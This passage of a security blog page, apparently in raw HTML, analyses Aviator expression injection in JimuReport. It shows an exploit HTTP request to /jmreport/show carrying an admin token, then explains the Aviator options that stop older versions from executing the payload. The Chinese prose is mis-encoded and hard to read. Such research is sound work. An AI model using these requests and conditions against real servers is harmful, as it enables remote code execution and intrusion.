application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json string" style="color:#e3116c">&quot;B4:B5&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json string" style="color:#e3116c">&quot;C4:C5&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json string" style="color:#e3116c">&quot;D4:D5&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json string" style="color:#e3116c">&quot;G4:G5&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json string" style="color:#e3116c">&quot;H4:H5&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json string" style="color:#e3116c">&quot;I4:I5&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json string" style="color:#e3116c">&quot;D1:G1&quot;</span><span class="token application-json punctuation" style="color:#393A34">,</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">        </span><span class="token application-json string" style="color:#e3116c">&quot;H3:I3&quot;</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json punctuation" style="color:#393A34">]</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json"></span><span class="token application-json punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-http codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token request-line method property" style="color:#36acaa">POST</span><span class="token request-line"> </span><span class="token request-line request-target url" style="color:#36acaa">/jmreport/show</span><span class="token request-line"> </span><span class="token request-line http-version property" style="color:#36acaa">HTTP/1.1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token header header-name keyword" style="color:#00009f">Host</span><span class="token header punctuation" style="color:#393A34">:</span><span class="token header"> </span><span class="token header header-value">localhost:8085</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token header header-name keyword" style="color:#00009f">User-Agent</span><span class="token header punctuation" style="color:#393A34">:</span><span class="token header"> </span><span class="token header header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token header header-name keyword" style="color:#00009f">X-Access-Token</span><span class="token header punctuation" style="color:#393A34">:</span><span class="token header"> </span><span class="token header header-value">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MTQ2Mjk0NjEsInVzZXJuYW1lIjoiYWRtaW4ifQ.--r2FRXzk7Nu2_Zrbcdn_0sN3c0zKhKeei2yewFTLx0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token header header-name keyword" style="color:#00009f">Accept</span><span class="token header punctuation" style="color:#393A34">:</span><span class="token header"> </span><span class="token header header-value">application/json, text/plain, */*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token header header-name keyword" style="color:#00009f">Content-Type</span><span class="token header punctuation" style="color:#393A34">:</span><span class="token header"> </span><span class="token header header-value">application/json</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json"></span><span class="token application-json punctuation" style="color:#393A34">{</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json">    </span><span class="token application-json property" style="color:#36acaa">&quot;id&quot;</span><span class="token application-json operator" style="color:#393A34">:</span><span class="token application-json"> </span><span class="token application-json string" style="color:#e3116c">&quot;53c82a76f837d5661dceec7d93afep&quot;</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json"></span><span class="token application-json punctuation" style="color:#393A34">}</span><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json"></span><br></span><span class="token-line" style="color:#393A34"><span class="token application-json"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jimureport-ä½ç‰ˆæœ¬ä¸ºä»€ä¹ˆæ— æ³•è§£æ">jimureport ä½ç‰ˆæœ¬ä¸ºä»€ä¹ˆæ— æ³•è§£æ<a href="#jimureport-ä½ç‰ˆæœ¬ä¸ºä»€ä¹ˆæ— æ³•è§£æ" class="hash-link" aria-label="Direct link to jimureport ä½ç‰ˆæœ¬ä¸ºä»€ä¹ˆæ— æ³•è§£æ" title="Direct link to jimureport ä½ç‰ˆæœ¬ä¸ºä»€ä¹ˆæ— æ³•è§£æ">â€‹</a></h2>
<p>ç”¨æœ€æ–°ç‰ˆçš„ 1.7.8 å¯ä»¥å¤ç°ï¼Œè€Œç”¨åˆ° 1.6.0 æ—¶å‘ç°è°ƒç”¨çš„æ˜¯ <code>com.googlecode.aviator.runtime.function.TraceFunction#call(java.util.Map&lt;java.lang.String,java.lang.Object&gt;, com.googlecode.aviator.runtime.type.AviatorObject, com.googlecode.aviator.runtime.type.AviatorObject)</code> è¿™ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”åœ¨æ‰§è¡Œ <code>com.googlecode.aviator.runtime.function.TraceFunction#traceArgs()</code> æ—¶æŠ¥é”™ã€‚</p>
<p><img loading="lazy" alt="image-20240807143426654" src="/assets/images/image-20240807143426654-074b338885a76fefa4ab6dd783f486dc.png" width="1964" height="306" class="img_ev3q"></p>
<p>å›åˆ° <code>com.googlecode.aviator.ClassExpression#executeDirectly()</code> æ–¹æ³•çœ‹çœ‹åœ¨è°ƒç”¨ <code>com.googlecode.aviator.ClassExpression#execute0</code> å‰å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p>
<p><img loading="lazy" alt="image-20240807143843482" src="/assets/images/image-20240807143843482-f9dcde16ca53a35abcebafa42847821f.png" width="1714" height="528" class="img_ev3q"></p>
<p>Avaitor çš„åº•å±‚ä¹Ÿç”¨çš„æ˜¯ ASM å°†è¡¨è¾¾å¼è½¬æ¢ä¸ºå¯æ‰§è¡Œçš„å­—èŠ‚ç ï¼Œè¿™é‡Œæ²¡æ³•æ­¥è¿›è°ƒè¯•æ— ç–‘æ˜¯ä¸Šäº†ä¸€ç‚¹éš¾åº¦ã€‚ä¸è¿‡æ²¡å…³ç³»ï¼Œå°†ä¾èµ–å•ç‹¬å–å‡º payload å¯ç”¨ï¼Œç›´è§‰å‘Šè¯‰æˆ‘é—®é¢˜å‡ºåœ¨é…ç½®é¡¹ï¼Œäºæ˜¯æ‰¾äº†ä¸€ä¸‹ä»£ç å®šä½åˆ° <code>com.googlecode.aviator.Options#TRACE_EVAL</code> è¿™ä¸ªé…ç½®ã€‚å…³äº <code>TRACE_EVAL</code> çš„ ASM é€»è¾‘ä½äº <code>com.googlecode.aviator.code.asm.ASMCodeGenerator#onMethodName</code></p>
<p><img loading="lazy" alt="image-20240807144306254" src="/assets/images/image-20240807144306254-b55bda42b979a64c21ea2be25a2b3726.png" width="1996" height="530" class="img_ev3q"></p>
<p>PS. å…³äº ASM çš„æ›´å¤šæ“ä½œå¯ä»¥åœ¨ <code>com.googlecode.aviator.AviatorEvaluatorInstance#innerCompile()</code> æ–¹æ³•æ–­ç‚¹ï¼Œä¹‹åå¯ä»¥è·Ÿåˆ° <code>com.googlecode.aviator.code.OptimizeCodeGenerator#callASM()</code> è°ƒç”¨ ASM çš„è§£æ</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="éªŒè¯çŒœæƒ³">éªŒè¯çŒœæƒ³<a href="#éªŒè¯çŒœæƒ³" class="hash-link" aria-label="Direct link to éªŒè¯çŒœæƒ³" title="Direct link to éªŒè¯çŒœæƒ³">â€‹</a></h3>
<p>å…ˆéªŒè¯ä¸‹çŒœæƒ³åœ¨ <code>com.googlecode.aviator.code.asm.ASMCodeGenerator#onMethodName()</code> æ–­ç‚¹ä¿®æ”¹è¯¥é…ç½® <code>this.instance.getOptionValue(Options.TRACE_EVAL).bool = false</code></p>
<p><img loading="lazy" alt="image-20240807152957990" src="/assets/images/image-20240807152957990-5fcbc7e5276b6b0bc264f77e14ac53fe.png" width="1103" height="576" class="img_ev3q"></p>
<p>é™¤æ­¤ä¹‹  å¤–åœ¨ <code>com.googlecode.aviator.runtime.type.AviatorJavaType#getValueFromEnv()</code> è§£æ <code>Base64Utils.decodeFromString</code> æ–¹æ³•æ—¶ï¼Œ<code>RuntimeUtils.getInstance(env).getOptionValue(Options.ENABLE_PROPERTY_SYNTAX_SUGAR).bool</code> ä¸º flase ï¼Œä¸è¿›å…¥ <code>getProperty</code> é€»è¾‘ï¼Œä¹Ÿæ–­ç‚¹ä¿®æ”¹ä¸€ä¸‹ã€‚</p>
<p><img loading="lazy" alt="image-20240807153209728" src="/assets/images/image-20240807153209728-4acdb05ad66b614cd67c7546de022d15.png" width="1103" height="473" class="img_ev3q"></p>
<p>æ„é€ è¿™ä¿©æ¡ä»¶ï¼Œå¼¹å‡ºè®¡ç®—å™¨ï¼ŒéªŒè¯çŒœæƒ³</p>
<ol>
<li>TRACE_EVAL ä¸º false</li>
<li>ENABLE_PROPERTY_SYNTAX_SUGAR ä¸º true</li>
</ol>
<p><img loading="lazy" alt="image-20240807153505210" src="/assets/images/image-20240807153505210-2e43a847773b13ce49eac33d044cd2e2.png" width="758" height="629" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="å“ªé‡Œçš„å˜åŠ¨">å“ªé‡Œçš„å˜åŠ¨ï¼Ÿ<a href="#å“ªé‡Œçš„å˜åŠ¨" class="hash-link" aria-label="Direct link to å“ªé‡Œçš„å˜åŠ¨ï¼Ÿ" title="Direct link to å“ªé‡Œçš„å˜åŠ¨ï¼Ÿ">â€‹</a></h3>
<p>ç„¶åå°±æ˜¯çœ‹å“ªé‡ŒåŠ çš„è¿™ä¸ªé…ç½®ï¼Ÿ<code>com.googlecode.aviator.Options#isValidValue()</code> å¯¹ <code>TRACE_EVAL</code> èµ‹å€¼ä¸º true</p>
<p><img loading="lazy" alt="image-20240807155037450" src="/assets/images/image-20240807155037450-9977a039d98baa37d9b5feb0140e7993.png" width="990" height="478" class="img_ev3q"></p>
<p>æœ€ç»ˆé—®é¢˜å‡ºåœ¨ <code>org.jeecg.modules.jmreport.desreport.express.ExpressUtil</code> çš„ static æ–¹æ³•å—ä¸­ï¼Œä½ç‰ˆæœ¬ä¸­å°†è¯¥å€¼è®¾ä¸º true</p>
<p><img loading="lazy" alt="image-20240807155208199" src="/assets/images/image-20240807155208199-0733522b48ad96d70bd64236a385a598.png" width="672" height="98" class="img_ev3q"></p>
<p>é«˜ç‰ˆæœ¬ä¸º false</p>
<p><img loading="lazy" alt="image-20240807155331007" src="/assets/images/image-20240807155331007-b96017a6f576420c5a0c07a76efdfbd6.png" width="1356" height="136" class="img_ev3q"></p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/Whoopsunix/whoopsunix.github.io/docs/02-java/Expression/Aviator/Aviator.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_vwxv"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/category/è¡¨è¾¾å¼æ³¨å…¥"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">è¡¨è¾¾å¼æ³¨å…¥</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/java/SAST/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">SAST ä¹‹è·¯</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#jdk-é«˜ç‰ˆæœ¬çš„-aviator-è¡¨è¾¾å¼æ³¨å…¥" class="table-of-contents__link toc-highlight">JDK é«˜ç‰ˆæœ¬çš„ Aviator è¡¨è¾¾å¼æ³¨å…¥</a></li><li><a href="#jimureport-sink" class="table-of-contents__link toc-highlight">Jimureport sink</a></li><li><a href="#jimureport-ä½ç‰ˆæœ¬ä¸ºä»€ä¹ˆæ— æ³•è§£æ" class="table-of-contents__link toc-highlight">jimureport ä½ç‰ˆæœ¬ä¸ºä»€ä¹ˆæ— æ³•è§£æ</a><ul><li><a href="#éªŒè¯çŒœæƒ³" class="table-of-contents__link toc-highlight">éªŒè¯çŒœæƒ³</a></li><li><a href="#å“ªé‡Œçš„å˜åŠ¨" class="table-of-contents__link toc-highlight">å“ªé‡Œçš„å˜åŠ¨ï¼Ÿ</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/Whoopsunix" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Whoopsunix Â© 2024</div></div></div></footer></div>
<script src="/assets/js/runtime~main.d07571fe.js"></script>
<script src="/assets/js/main.c18b1eab.js"></script>
</body>
</html>